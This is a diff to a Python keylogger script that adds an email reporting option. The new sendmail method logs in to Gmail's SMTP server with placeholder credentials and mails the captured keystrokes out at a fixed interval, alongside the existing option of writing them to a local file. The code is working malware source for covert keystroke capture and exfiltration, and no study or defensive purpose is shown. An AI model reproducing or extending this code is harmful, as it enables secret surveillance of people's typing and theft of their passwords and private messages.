@@ -1,14 +1,19 @@
+import smtplib
+
 import keyboard  # for keylogs
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
 
 REPORT_INTERVAL = 10
+EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
+EMAIL_PASSWORD = "thisisafakepassword"
 
 
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, report_method="file"):
         self.interval = interval
+        self.report_method = report_method
 
         self.log = ""
 
@@ -56,7 +61,10 @@ class Keylogger:
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            self.report_to_file()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -64,6 +72,18 @@ class Keylogger:
         timer.daemon = True
         # start the timer
         timer.start()
+
+    def sendmail(self, email, password, message):
+        # manages a connection to the SMTP server
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        # connect to the SMTP server as TLS mode ( for security )
+        server.starttls()
+        # login to the email account
+        server.login(email, password)
+        # send the actual message
+        server.sendmail(email, email, message)
+        # terminates the session
+        server.quit()
 
     def start(self):
         # record the start datetime
@@ -81,5 +101,5 @@ if __name__ == "__main__":
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=REPORT_INTERVAL)
+    keylogger = Keylogger(interval=REPORT_INTERVAL,report_method="file")
     keylogger.start()
